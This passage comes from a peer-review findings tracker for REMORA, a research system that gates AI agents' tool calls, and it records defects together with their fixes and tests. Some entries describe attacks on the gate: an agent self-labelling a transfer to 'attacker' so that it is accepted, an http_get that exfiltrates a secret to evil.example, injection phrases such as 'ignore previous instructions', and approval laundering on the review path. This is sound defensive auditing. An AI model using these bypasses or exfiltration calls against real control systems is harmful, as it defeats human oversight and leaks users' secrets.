| Verification | `scripts/ots_seal.py` (tested by `tests/test_ots_seal.py`) builds a manifest of the LF SHA-256 of every sealed file named by the seal records and stamps it. `artifacts/timestamps/seal_manifest_2026-10-18.json` (SHA-256 `2be2eafcf7538b499d9dcb99e451598c2b6065d2a05ab0245067200fab76cab7`, 18 files) was stamped on 2026-10-18 on four calendars. On 2026-10-19 `ots_seal.py upgrade` fetched Bitcoin attestations from all four calendars: blocks 972029, 972031, 972032 and 972057. The earliest block timestamp is 2026-10-18 17:07:19 UTC. Each block's merkle root, as `ots --no-bitcoin verify` reports it, matches the root a public block explorer (blockstream.info) gives for that height. The upgraded proof is committed. `ots_seal.py verify` now reports SAP v7 as changed since the stamp: v7 is a draft, its addenda were edited after 2026-10-18, and the stamp covers the earlier text only. The stamp attests existence from 2026-10-18 only: the sealing dates of SAP v5 and v6 and the evaluated holdouts rest on git history alone and stay unattested, an accepted limitation for that evidence. SAP v7 §10 now requires a stamp after the lock and before the first test-split episode. Remaining: the v7 stamp at its seal, which waits for the owner's approval of SAP v7 (§15.5). |
| Status | IN_PROGRESS |

### PRF-027 "Every number is bound to a claim register" was untrue

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | +0.46, the p-value and "90% vs ≤60%" are not CLAIM-001 metrics, and several sections have no claims. |
| Evidence | claim register metrics; paper abstract at `f66c4f7b`. |
| Affected claims | CLAIM-001 |
| Action | Say "each result above cites its claim-register entry" and "the headline numbers". |
| Owning PR | level-1 PR |
| Verification | A grep for "Every number is bound" and "gates every number" in both files returns nothing. |
| Status | RESOLVED |

### PRF-028 The "≤60%" accuracy comparison omits the temperature-gate baseline

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | Against the omitted temperature-gate baseline the utility gain is +0.26, not +0.46. |
| Evidence | `results/toolcall_benchmark_v2_significance.json` (reviewer). |
| Affected claims | CLAIM-001 |
| Action | Done: the abstract no longer cites the accuracy comparison. Show the retired temperature-gate row in §10.3 and scope +0.46 to the keyword heuristics. |
| Owning PR | level-1 remainder PR (stacked on #927) |
| Verification | `results/toolcall_benchmark_v2_significance.json` (`comparisons.remora_temperature_gate_heuristic`) gives a utility delta of +0.259 (95% CI [0.154, 0.371], one-sided p ≈ 1e-4) at the same 1.4% unsafe rate; `results/toolcall_benchmark_v2_results.json` gives that arm accuracy 0.60 and mean utility 0.361. Both files now show this row in the tool-call table (§10.3) and state +0.456 against each keyword heuristic and +0.259 against the temperature gate, in §10.3, §14 and §17. The claim-register statement for CLAIM-001 already says "+0.46 vs heuristics" and was not changed. |
| Status | RESOLVED |

### PRF-029 The .tex had a thinner limitations section and different results sections from the .md

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | The .tex lacked oracle diversity, in-sample τ, proxy evidence, demo data, MetaJudge circularity, PS not deployed and no human evaluation. It named a "32-case" cross-domain replay that the .md does not have, and lacked the .md's N=36 benchmark. |
| Evidence | `paper/remora_paper.tex` Negative Results at `f66c4f7b`. |
| Affected claims | none |
| Action | Port the limits and replace the 32-case mention with the N=36 benchmark. |
| Owning PR | level-1 PR |
| Verification | The .tex now has a paragraph for each listed limit and names the 36-case benchmark with its artifact. The compiled PDF has 27 pages, no overflow, and no undefined references (local texlive build). |
| Status | RESOLVED |

### PRF-030 Proof and guarantee wording without formal methods

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | "Theoretically optimal" (El-Yaniv & Wiener) does not hold for three LLMs. The conformal "per-phase coverage guarantees" fail under non-exchangeability. "Proves" was used for a parity test, and "provably serves the wrong goal" overstated the check. |
| Evidence | §2.4, §2.5, §13.11, §10.9. |
| Affected claims | none |
| Action | Weaken the wording. |
| Owning PR | level-1 PR |
| Verification | A grep for "theoretically optimal", "provably" and "proves the trace" in both files returns nothing. The conformal sentence now says coverage holds only under exchangeability. |
| Status | RESOLVED |

### PRF-031 Appendix F and §14 disagreed with the register on gates and AII

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | Appendix F said one production gate remains; CLAIM-006 says two (REM-021, REM-023). §14 cited AII 0.8442 TRAINED without the same-day regression to CAPABLE. |
| Evidence | CLAIM-006 caveat and statement. |
| Affected claims | CLAIM-006 |
| Action | Align with the register. |
| Owning PR | level-1 PR |
| Verification | Appendix F now lists REM-021 and REM-023. §14 (.md) and Threats (.tex) give the regression to 0.7885. |
| Status | RESOLVED |

### PRF-032 "Non-overlapping CIs are used to assess significance"

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | Comparing whether intervals overlap is not a valid significance test. |
| Evidence | §14 Statistical validity. |
| Affected claims | none |
| Action | Remove the statement. |
| Owning PR | level-1 PR |
| Verification | Both files now say that overlapping or non-overlapping intervals are not evidence of a difference. |
| Status | RESOLVED |

### PRF-033 Audit log called "immutable" in one place and tamper-evident in another

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | §2.7 said "immutable hash-chaining", but §8.2 concedes tamper-detection only. |
| Evidence | §2.7, §8.2. |
| Affected claims | none |
| Action | Use "tamper-evident" and point to §8.2. Citing forward-secure and anchored-log literature is part of PRF-017. |
| Owning PR | level-1 PR |
| Verification | A grep for "immutable hash" in both files returns nothing. |
| Status | RESOLVED |

### PRF-034 Wrong cross-reference to §13.9

| Field | Value |
|---|---|
| Severity | NIT |
| Claim | §10.9 pointed to §13.9 (MetaJudge circularity) for the semantic-authority mechanism. |
| Evidence | `paper/remora_paper.md` §10.9. |
| Affected claims | none |
| Action | Point to §10.8. |
| Owning PR | level-1 PR |
| Verification | §10.9 now cites §10.8. |
| Status | RESOLVED |

### PRF-035 Table numbering in the .md is out of order

| Field | Value |
|---|---|
| Severity | NIT |
| Claim | The table captions run 3, 1, 4, 5, 7, 6, 8 in document order, with no Table 2. |
| Evidence | `paper/remora_paper.md`. |
| Affected claims | none |
| Action | Renumber the tables and every reference to them. |
| Owning PR | level-1 remainder PR (stacked on #927) |
| Verification | At `fix/claims-and-paper-2026-10-18` the numbered .md tables ran 3, 1, 4, 5, 7, 6, 6b, 8 in document order, with no Table 2. After the PRF-018 appendix move they are renumbered 1 to 8 in document order: hard blocks (§6.2) 1, tool-call benchmark (§10.3) 2, AgentHarm (§10.6) 3, cross-domain (§10.7) 4, C-ext3 targets (§10.9) 5, component ablation (§11.1) 6, three-oracle ablation (Appendix G.4) 7, Mondrian (Appendix G.5) 8. Every in-text reference was rewritten with the same mapping, including the Figure 1 box and §9.2; a grep for `Table [0-9]` in document order returns 1, 1, 2, 2, 3, 4, 5, 5, 6, 7, 8, 7, the last being the Appendix G.6 back-reference to the Appendix G.4 table. No other repository document cites a paper table by number. The .tex numbers its tables automatically. |
| Status | RESOLVED |

### PRF-036 Internal codenames are used without definition

| Field | Value |
|---|---|
| Severity | NIT |
| Claim | CLAIM-xxx, SAP v6, C-ext2/3/4, F1/V2D, E-ECB/E-FA/E-EE/E7, SHADOW_ONLY and REM-xxx appear without definition. |
| Evidence | Abstract and body. |
| Affected claims | none |
| Action | Add a short glossary, or define each at first use. |
| Owning PR | level-1 remainder PR (stacked on #927) |
| Verification | Both files now carry an "Identifiers used in this paper" list directly after the keywords, before §1. It defines CLAIM-NNN, REM-NNN, CAP-NNN, RMR-CR-NNN, NEGATIVE_RESULTS.md §N, SAP vN, C-ext2/3/4, arm F, F1, V2D, E-ECB, E-FA, E-EE, E7, CP-F1 to CP-F4, the declaration status values, SHADOW_ONLY, AROMER and AII. The abstract now glosses SHADOW_ONLY where it is first used. The F1/V2D definitions were checked against SAP v6 §4 (Arms) and the arm F definition against SAP v5 §5. |
| Status | RESOLVED |

### PRF-037 "Eliminated" for a zero count with an upper bound

| Field | Value |
|---|---|
| Severity | NIT |
| Claim | 0/500 with an upper bound of 0.76% is "no accepts observed", not elimination. |
| Evidence | Abstract, introduction, §17. |
| Affected claims | CLAIM-019 |
| Action | Reword. |
| Owning PR | level-1 PR |
| Verification | See PRF-007. |
| Status | RESOLVED |

### PRF-038 Comparator figures and 2026 references need source checks

| Field | Value |
|---|---|
| Severity | NIT |
| Claim | Progent (39.9% to 1.0%) and CaMeL (77%, "provable security") depend on the arXiv version cited. The 2026 references (AIRGuard, PCAA, PoE, Michael & Roesner) should be checked against their sources. |
| Evidence | §2.11; the reviewer flagged uncertainty rather than error. |
| Affected claims | none |
| Action | Pin the arXiv versions and re-check each figure. |
| Owning PR | #929 (stacked on #927) |
| Verification | Checked 2026-10-18 against the arXiv HTML and abstracts of every version. Progent: v1 reports 41.2% to 2.2%; v2 (2025-08-30) reports 39.9% to 1.0% for LLM-generated policies with gpt-4o, at 76.3% utility against 79.4% undefended (manual policies reach 0%); v3 (2026-05-14) repeats 39.9% to 1.0%. The paper now pins v2 and names the policy mode, model and utility. CaMeL: v1 reports 67%, v2 (2025-06-24) reports 77% "with provable security (compared to 84% with an undefended system)"; the paper pins v2, adds the 84% baseline and attributes "provable security" to the authors. AIRGuard (2605.28914v1): "authority confusion" and action-time least privilege match the abstract. PCAA (2606.04104v1) has five checkpoints, so the paper now says "five checkpoints, from pre-action admissibility through approval to outcome closure" instead of naming three. PoE (2607.05397v1) proves soundness "under explicit cryptographic and deployment assumptions"; the .md said cryptographic only and now says both. Michael & Roesner (2607.13718v2): 21 proposals confirmed; the survey says "none of the proposals we review achieve all three", so the paper's "no existing system simultaneously achieves" is narrowed to "none of them". All six references now carry the version read. |
| Status | RESOLVED |

### PRF-039 The roadmap stated the C-ext4 safety constraint as a Wilson upper bound

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | `docs/13-research-frontier-roadmap.md` says the wrong-call constraint is a Wilson upper bound ≤1%. SAP v6 set a point estimate ≤1%, and C-ext4's upper bound was 1.29%. A bound of 1% at zero observed needs at least 381 episodes. |
| Evidence | `results/routing_bench_bfcl_v4_cext4_results.json` `targets.known_wrong_call_accept` (`<= 0.01`, wilson95 [0, 0.0129]); z²/(n+z²) < 0.01 first at n=381. |
| Affected claims | CLAIM-021 |
| Action | Correct the roadmap wording. |
| Owning PR | level-1 PR |
| Verification | The roadmap now states the point-estimate target, the 1.29% bound and the 381-episode requirement. |
| Status | RESOLVED |

### PRF-040 The library path trusts caller-supplied risk, action type and trust

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | `assess_tool_call("xfer", {"to": "attacker", "amt": 1e6}, risk_tier="low", action_type="read", trust_score=0.95, phase="ordered")` returns ACCEPT. An untrusted agent that labels its own call decides the outcome. |
| Evidence | Reproduced 2026-10-17 on `bce4bfeb`. Without the labels the same call returns VERIFY. The README states that the library call is advisory and that enforcement is `/v1/execution/*`, where risk comes from a registry keyed by tool name. |
| Affected claims | none (no claim measures the library path) |
| Action | Level 3: the threat model must state that labels from the agent are untrusted. The library API should refuse caller labels by default, or mark its result advisory in the type; a test should pin that an untrusted label cannot raise autonomy. |
| Owning PR | #934 (owner decision 2026-10-18: registry requirement). The change is in `remora/assess.py` and `remora/cli.py`; nothing under `remora/policy/` changed. |
| Verification | `assess_tool_call` and `what_if_tool_call` take `registry=`. Labels from the caller or from name inference cannot produce ACCEPT: an engine ACCEPT is lowered to VERIFY with the reason `caller_labels_untrusted`, recorded in the envelope. A tool missing from a supplied registry is assessed as critical/unknown, and `should_execute` requires `label_source == "registry"`. The attack call above now returns VERIFY. Tests in `tests/test_assess_registry.py`: `test_prf040_attack_without_registry_is_not_accepted`, `test_prf041_exfil_read_without_registry_is_not_accepted`, `test_registry_classifying_xfer_honestly_does_not_accept`, `test_caller_labels_cannot_lower_a_registry_classification`, `test_registry_low_risk_read_still_accepts`, `test_unknown_tool_in_registry_fails_closed`, `test_no_caller_label_combination_accepts_without_registry` (Hypothesis, 300 examples) and `test_exhaustive_caller_labels_never_accept_without_registry`; CLI tests `test_remora_assess_caller_labels_never_accept` and `test_live_accept_on_caller_labels_is_capped_in_decision_and_envelope` in `tests/test_cli.py`. The same cap now covers `/v1/assess` and the action-gate adapters in `remora/adapters/` (RMR-AUD-011): the route resolves labels from the server registry and the adapters take `registry=`, so a caller label cannot reach ACCEPT on either path. Still open: `trust_score`/`phase` remain caller stand-ins and can lift a registry-classified low-risk read to ACCEPT; the registry binds a name, not a callable; the threat-model statement belongs to level 3 (PRF-015). |
| Status | RESOLVED |

### PRF-041 No assessment of argument content, so a read tool can exfiltrate

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | `http_get(url="https://evil.example/?k=SECRET")` labelled low/read with high trust returns ACCEPT. Nothing inspects argument values for secrets or destinations, and nothing tracks data across calls. |
| Evidence | Reproduced 2026-10-17 on `bce4bfeb`. On the server path, taint comes from a request field the agent can omit. §13.13 of the paper already disclaims trajectory-level and data-flow enforcement. Since the PRF-040 fix the call with caller labels returns VERIFY, but the same call with a registry that classifies `http_get` as a low-risk read still returns ACCEPT, so this finding stands. |
| Affected claims | none |
| Action | Level 3: put argument-content and destination policy in the threat model, and measure exfiltration in the attack evaluation (PRF-015) against a policy-only and an information-flow baseline. |
| Owning PR | evidence/execution-chain-attack-eval PR (measurement) |
| Verification | Measured in `artifacts/posthoc/execution_chain_attack_eval_v1.json` (`scripts/execution_chain_attack_eval.py`, `tests/test_execution_chain_attack_eval.py`, NEGATIVE_RESULTS.md §87). On `/v1/execution` with `REMORA_LOW_CONSEQUENCE_ACCEPT=1`, `/assess` gives the exfiltrating `http_get` the same ACCEPT as a benign one, and the secret reached the sink in 6 of 6 read-exfiltration and 5 of 5 composed read-then-send attacks, on REMORA and on the policy-only baseline alike. Declaring the untrusted context did not change the decision, because without a semantic bundle it never reaches the observation. The information-flow baseline is `remora.flow.check.flow_check`, applied by the harness and labelled library_only: it refused 10 of 10 and also refused 1 of 4 benign controls. 2026-10-19: paper §3.1 now states that the decision reads neither argument content nor destinations, so a low-risk read whose URL carries a secret is not defended, and that a destination policy must come from `remora.flow`. Remaining: a decision path that reads the flow verdict (IFC-05b) and a measurement with it on; the grounded-read path was not configured and is unmeasured. R3 (2026-10-18) closed two holes in the library flow check that this measurement relies on: an empty or missing recipient argument now counts as unresolved, and FL-01 covers URL, email and IBAN arguments (PRF-050). The flow verdict is still not wired into a decision; the SDD `docs/design/compositional-authority-preservation-v1.md` plans it as CAPR-03. |
| Status | IN_PROGRESS |

### PRF-042 The injection pattern list misses simple paraphrases

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | "ignore previous instructions" escalates, but "ignore all previous instructions" and "disregard the above" are not classified as injection. |
| Evidence | Reproduced 2026-10-17 on `bce4bfeb`. Both paraphrases route to VERIFY, not ACCEPT, with high-trust low/read labels. A substring list cannot be a security boundary, and the paper does not claim it is one. |
| Affected claims | none |
| Action | Do not grow the list as a defence. State in the threat model that pattern matching is a hint, and measure injection with an external benchmark (AgentDojo or InjecAgent) in level 3. |
| Owning PR | fix/peer-review-remaining (threat model); SAP v7 Q6 (benchmark) |
| Verification | 2026-10-19: paper §3.1 now states that the injection pattern list is a routing hint, not a security boundary, and that an injection is judged by what the injected call can reach. Remaining: the external benchmark run. Pending. Pre-registered, not run: SAP v7 §13 (Q6, draft addendum of 2026-10-18) runs InjecAgent at `f19c9f2c` through `/v1/execution/assess` against allow-all and a policy-only gateway, with a registry fixed before any agent output, benign twin controls, hypotheses H4a and H4b, and blocks due to the pattern list counted apart (S6.5). No data yet; owner approval and sealing are pending (§15.5). The addendum and the R3 corrections to the draft (inspected tasks kept out of test, PRF-055) are in master (`a8d75c2b`, `8ccd406c`). |
| Status | IN_PROGRESS |

### PRF-043 The paper uses BFCL v4 as its main evidence without citing it

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | The abstract, §10.8 and §10.9 rest on BFCL v4, but the bibliography has no entry for Gorilla or the Berkeley Function Calling Leaderboard (Patil et al.). |
| Evidence | A grep for Patil, Gorilla and Berkeley Function Calling in paper/remora_paper.md returns nothing (2026-10-17). The code cites the upstream repository (remora/toolcall/routing/sources/bfcl.py), and the research control matrix now records it under RES-023. |
| Affected claims | CLAIM-018, CLAIM-019, CLAIM-021 |
| Action | Added BFCL and Gorilla references to both bibliographies and assigned their roles in the research control matrix (RES-023 and bibliography entries). |
| Owning PR | #927, reconciled with #909 |
| Verification | 2026-10-18: `check_paper_sync.py` passes with 73 paired bibliography entries; `generate_research_control_matrix.py --check` passes. Both bibliographies cite BFCL/Gorilla. |
| Status | RESOLVED |

### PRF-044 Review path: an ABSTAIN could be laundered into an executed call (RMR-AUD-001)

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | The proposal fields outside `canonical_tool_call_hash` (`schema_valid`, `rollback_available`, `untrusted_context`, `intent_ref`, derivations) were not bound between `/assess` and `/execute`. A caller could turn an ABSTAIN into an approvable ESCALATE with `schema_valid=false`, have it approved, then drop the flag and add `untrusted_context` at `/execute` so the fresh decision was VERIFY, which the approval accepted. |
| Evidence | Reproduced at `b64e3cc1` through `/v1/execution/*`. Fix: `remora/execution/service.py:575` (`proposal_envelope_hash`, recorded at assess and compared at execute). |
| Affected claims | none (no claim measures the review path) |
| Action | Bind every proposal field in a hash recorded at assess, and refuse a different proposal at execute without consuming the approval. The engine half, a risk signal that opens a review route over an abstain, is PRF-046. |
| Owning PR | #936 (`7933b1fc`), in master via `3aeb3016` |
| Verification | `tests/test_review_path_audit_r3.py`: `test_abstain_to_escalate_laundering_is_refused`, `test_any_proposal_field_added_at_execute_is_refused`, `test_the_proposal_hash_covers_every_proposal_field`, `test_an_item_whose_assessment_carries_no_proposal_hash_is_refused`; `tests/test_review_path_public_api_e2e.py::test_p0_1a_taint_added_at_execute_does_not_launder_a_reissued_work_order`. All pass on master `5b2c7dc8`. |
| Status | RESOLVED |

### PRF-045 An approved ESCALATE could never execute (RMR-AUD-002)

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | `_approval_survives` admitted only ACCEPT and VERIFY as fresh decisions. Assess (ESCALATE), approval by a senior authority, then execute with the same observation always returned `approval_invalidated`, so every deterministic escalation was a dead end. |
| Evidence | Reproduced at `b64e3cc1`. Fix: `remora/governance/review_queue.py:85`. |
| Affected claims | none |
| Action | Record the approved reasons with the approval. An approved ESCALATE survives a fresh decision whose reasons lie within them; a new reason or a fresh ABSTAIN still voids it. |
| Owning PR | #936 (`b0912eeb`) |
| Verification | `tests/test_review_path_audit_r3.py`: `test_escalate_regate_deadlock_an_approved_escalation_executes`, `test_an_approved_escalation_survives_the_same_or_fewer_reasons`, `test_a_new_escalation_reason_invalidates_the_approval`, `test_a_fresh_abstain_still_invalidates_an_approved_escalation`, `test_the_dispatch_regate_applies_the_same_rule`. All pass. |
| Status | RESOLVED |

### PRF-046 Policy decisions were not monotone in risk signals (RMR-AUD-003)

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | Adding a risk signal could make a decision more executable or more approvable. A VERIFY gate ahead of an ESCALATE gate masked it: `distribution_shift` hid `rollback_unavailable`, and `high_risk_no_evidence` hid `env_mismatch_escalate`. `schema_valid=false` turned a non-approvable cross-tenant ABSTAIN into an approvable ESCALATE. |
| Evidence | Every counterexample reproduced at `3746bc5d`. Fix: non-approvable reasons rank lowest (`remora/policy/composition.py:66`), and every firing guard and gate enters the meet (`remora/policy/decision_engine.py:160`, `:513`). |
| Affected claims | none changed: C-ext3 has 0 of 8,397 episode decisions changed, and C-ext4 reproduces its 36 counts |
| Action | Meet over every firing hard guard and conditional gate, with non-approvable refusals strictest. Remaining: the owner decided on 2026-10-18 that approvability must be monotone too. A risk signal may not open a review route over an abstain, and a higher risk tier may not lower a production write. |
| Owning PR | #944 (`99cce4cd`); the remaining decision in a follow-up PR |
| Verification | `tests/policy/test_signal_monotonicity.py`: `test_distribution_shift_does_not_hide_rollback_unavailable`, `test_high_risk_without_evidence_does_not_hide_environment_mismatch`, `test_a_non_approvable_refusal_survives_an_escalating_flag`, `test_taint_never_masks_a_goal_mismatch_escalation`, `test_adding_a_risk_signal_never_raises_executability` (Hypothesis). Still strict xfail on master: `test_a_risk_signal_still_opens_a_route_over_an_epistemic_abstain` and `test_raising_the_risk_tier_never_lowers_a_production_write`. NEGATIVE_RESULTS.md §90. |
| Status | IN_PROGRESS |

### PRF-047 Effect verification accepted self-attested and unauthorized evidence (RMR-AUD-004)

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | The three #918 cases were runtime weaknesses, not only limits of the frozen interop schema. The executor could verify its own effect with arbitrary digests through the operator role and the `_authorised_verifier` fallback. An effect after an abstain or a rejection was projected as `EFFECT_VERIFIED`. `target_selector` was never read. The MCP gateway built the expected value from the tool's own reply, and posted receipts the API refused while telling the model `EFFECT_VERIFIED`. |
| Evidence | Reproduced on the #920 branch `3a29082a` and through the public API (P0-4A: a crashed call promoted to `EFFECT_VERIFIED`). Fix: `remora/governance/effect_receipt.py:184` (`_authorization_of`), `servers/execution_api.py:2948` and `:3096`, `remora/governance/effect_receipt_signing.py`, `workers/mcp-gateway/src/mcp.ts:49`. |
| Affected claims | none |
| Action | Effect evidence only after a full authorization lineage. A separate `verify_effect` capability whose holder is not the executor. A selector bound to the called object. Signed receipts under `REMORA/EFFECT-RECEIPT/v1`, with REMORA re-evaluating the ToolSpec v5 postcondition and deriving the vantage. The frozen `effect-evidence-v1` schema is unchanged. |
| Owning PR | #942 (`0d62d71d`), #940 (`e86b7d0b`), CAPR-06/07/08 (`1097567f`, `2d8b8682`), in master via `dbd19f23` |
| Verification | `tests/test_effect_lineage_and_audit_projection.py` (44 tests, including `test_no_effect_after_the_policy_abstained`, `test_evidence_about_another_object_does_not_verify`, `test_p0_4a_the_executor_cannot_verify_its_own_crashed_call`, `test_p0_4a_is_refused_in_production`) and `tests/test_effect_receipt_endpoint_signed.py` (18 tests, including `test_remora_computes_a_mismatch_whatever_the_receipt_claims`, `test_an_observation_of_another_target_never_verifies`, `test_the_executor_cannot_submit_a_signed_receipt`) pass. `tests/test_mcp_gateway_effect_receipt_contract.py` needs esbuild, skips locally and runs in CI. Attributing the delta to the dispatch stays open as NEGATIVE_RESULTS.md §85. |
| Status | RESOLVED |

### PRF-048 The audit chain dropped re-approvals and froze the state at REFUSED (RMR-AUD-005)

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | The outbox key for `approved` and `execution_*` events had no attempt number, so a second approval or refusal on the same item was dropped from the chain. `current_state` returned REFUSED after any earlier refusal, even while the item was approved again. |
| Evidence | Reproduced on the durable path (`REMORA_CHAIN_DB`). Fix: `remora/execution/review_service.py:213`, `remora/execution/projections.py:223` (`_fold_state`). |
| Affected claims | none |
| Action | Approval keys carry the approval's `issued_at` and refusals an attempt id. The state is a fold over the chain in order. |
| Owning PR | #942 (`0d62d71d`) |
| Verification | `tests/test_effect_lineage_and_audit_projection.py`: `test_a_second_approval_is_recorded`, `test_every_binding_refusal_is_recorded_and_the_approval_stands`, `test_a_binding_refusal_leaves_the_approval_standing`, `test_a_voided_approval_returns_to_review_and_can_be_approved_again`, `test_terminal_refusals_still_read_refused`. All pass. |
| Status | RESOLVED |

### PRF-049 The review path did not bind actor, task, risk tier or intent authority (RMR-AUD-006)

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | Another operator could execute an approved item, under another task. An approval survived a risk raise when both tiers decide VERIFY. An `intent_ref` swapped at `/execute` signed an intent authority the reviewer never saw into the grant and the lease. |
| Evidence | Measured by the attack evaluation (NEGATIVE_RESULTS.md §87) and reproduced through the public API (P0-1B). Fix: `remora/execution/service.py:640` (`approved_context_refusal`). |
| Affected claims | none |
| Action | Compare the executing context with the assessed record exactly as the ACCEPT token does, void an approval whose reviewed tier changed, and bind the intent authority. Delegated execution is opt-in, named at proposal and bound in the context. |
| Owning PR | #935 (`7707657a`), #936 (`0880232d`, `7b158ca0`) |
| Verification | `tests/test_review_path_binding.py` (18 tests), `tests/test_review_path_audit_r3.py::test_intent_ref_swap_on_review_is_refused`, `tests/test_review_path_public_api_e2e.py::test_p0_1b_another_operator_with_a_swapped_task_is_refused` and `tests/test_delegated_execution_and_approval_policy.py` (39 tests) pass. The regenerated attack evaluation ran 0 of 9 cross-context attacks on REMORA. |
| Status | RESOLVED |

### PRF-050 The flow check passed an empty recipient list (RMR-AUD-007)

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | A derived-recipient sink whose recipient argument was `[]`, `None` or omitted gave an empty reached set and a clean verdict for a secret payload. FL-01 let a URL argument through when the recipients were static. |
| Evidence | Reproduced at `3746bc5d`. Fix: `remora/flow/check.py:110`, and FL-01 in `remora/flow/spec.py`. |
| Affected claims | none (no decision reads the flow verdict yet, IFC-05b) |
| Action | A recipient rule that yields no value reports `unresolved:<arg>`. FL-01 requires the URL, email and IBAN arguments of a writing tool to be covered by a recipient rule. 007c was not adopted (see R3 errors). |
| Owning PR | #939 (`c608a3b4`) |
| Verification | `tests/flow/test_flow_check.py`: `test_a_derived_recipient_rule_that_yields_no_one_is_unresolved`, `test_a_rule_with_no_values_names_every_argument_unresolved`, `test_an_absent_cc_beside_a_resolved_to_is_not_unresolved`; `tests/flow/test_toolspec_flow.py`: `test_fl01_a_url_argument_must_be_the_url_host_of_rule`, `test_fl01_a_writer_names_every_email_and_iban_argument_as_a_recipient`, `test_fl01_an_email_a_read_only_tool_looks_up_reaches_no_one`. All pass. |
| Status | RESOLVED |

### PRF-051 Flow labelling of containers and handle references (RMR-AUD-008)

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | A result container with no rule of its own became one handle, so BY_VALUE child rules were never reached. Argument labels removed the model reader from PUBLIC fields. A `{"$handle", "$type"}` object was not resolved as a whole handle. |
| Evidence | All three reproduced at `3746bc5d`. Fix: `remora/flow/handles.py:140`, and FL-14 in `remora/flow/spec.py`. |
| Affected claims | none |
| Action | Handle-reference objects resolve whole; an altered one stays literal and carries the context label. The first two claims contradict SDD §3.2.1 and §3.3 and were not adopted. FL-14 refuses an unreachable BY_VALUE rule instead, and it showed that the SDD's own §5.1 `get_inbox` example breaks that rule. |
| Owning PR | #939 (`c608a3b4`) |
| Verification | `tests/flow/test_labeler_handles.py`: `test_a_handle_reference_object_resolves_as_a_whole_handle`, `test_an_altered_handle_reference_is_literal_and_carries_the_context`, `test_an_undeclared_container_hides_its_whole_subtree`; `tests/flow/test_toolspec_flow.py`: `test_fl14_a_by_value_rule_under_a_container_rendered_as_a_handle`, `test_fl14_refuses_the_sdd_inbox_excerpt_as_written`. All pass. |
| Status | RESOLVED |

### PRF-052 The v2 intent extractor supports mutations in conditional and informational sentences (RMR-AUD-009)

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | `bfcl_semantic_bundle_v2.extract_intent` returns SUPPORTED for `cancel_booking` on "Inspect booking B-104 before cancel.", "Tell me if I can cancel booking B-104." and "Review the policy before we cancel booking B-104." PRF-002 checked negation only. |
| Evidence | All three reproduced at `3746bc5d` (`remora/toolcall/routing/bfcl_semantic_bundle_v2.py:387`). The sealed C-ext4 manifest pins v2 by hash, so it stays unchanged. |
| Affected claims | CLAIM-019, CLAIM-021 (a validity limit of the semantic arms) |
| Action | A versioned v3 extractor (`remora/toolcall/routing/bfcl_semantic_bundle_v3.py:132`) keeps context spans, conditionals and questions, and no sealed runner uses it. Remaining: the paper's §81 citation names negation only, and v3 has no sealed run. |
| Owning PR | #938 (`32139442`) |
| Verification | `tests/test_bfcl_semantic_bundle_v3.py`: `test_v2_supports_the_mutation_on_the_audit_sentences`, `test_v3_a_qualified_mutation_is_never_supported`, `test_v3_the_information_request_is_the_read`, `test_v3_keeps_v2_verdicts_on_unqualified_tasks`, `test_v3_is_wired_into_no_sealed_runner`, `test_dev_comparison_artifact_reproduces`. All pass. The development comparison (`artifacts/posthoc/bfcl_v3_extractor_dev_compare.json`) is exploratory. NEGATIVE_RESULTS.md §81. |
| Status | IN_PROGRESS |

### PRF-053 Worker edge: issuer check, approval hash and review redemption (RMR-AUD-010)

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | `agent-control` verified Access JWTs without checking the issuer. Its approval hash used `JSON.stringify` and bound neither tool, tenant nor target. It had no way to redeem an approved review item, so a write looped on HTTP 402. `mcp-gateway` readiness and duplicate JSON members were open at `b64e3cc1`. |
| Evidence | Confirmed in code and with vitest repros. Fix: `workers/shared/access_jwt.ts:140`, `canonicalToolCallHash` in `workers/agent-control/src/index.ts`, `workers/agent-control/src/execution_adapter.ts:204`. |
| Affected claims | none |
| Action | One shared Access verifier with the issuer check, canonical approval hashing, and redemption of an approved review item. #925 and #920 fixed readiness and duplicate members. |
| Owning PR | #940 (`e86b7d0b`); #925; #920 |
| Verification | The worker vitest suites cover the issuer refusal and the round trip from 402 through approval to redemption. They had 189 passing at #940 and run in CI; they were not rerun here. |
| Status | RESOLVED |

### PRF-054 `/v1/assess` and the adapters trusted caller labels (RMR-AUD-011)

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | After PRF-040 fixed the library, `POST /v1/assess` and `remora/adapters/` still let caller-supplied risk and action labels reach ACCEPT. |
| Evidence | Reproduced with the oracle ensemble in the ordered phase at high trust. Fix: label resolution in `servers/api.py` (`label_source`, line 1880). |
| Affected claims | none (no benchmark goes through these paths) |
| Action | The server resolves labels from its registry, and caller labels can only raise caution. Without registry labels ACCEPT is capped at VERIFY. `/v1/rerun` and the adapters follow the same rule. |
| Owning PR | #941 (`85083b67`), in master via `a2adeae7` |
| Verification | `tests/test_assess_api_labels.py` (11 tests, including `test_attack_labels_without_tool_call_do_not_accept`, `test_unregistered_tool_ignores_caller_labels`, `test_registered_low_read_tool_still_accepts`, `test_rerun_of_caller_labels_stays_capped`). All pass. |
| Status | RESOLVED |

### PRF-055 Benchmark construction and the SAP v7 draft (RMR-AUD-012)

| Field | Value |
|---|---|
| Severity | MAJOR |
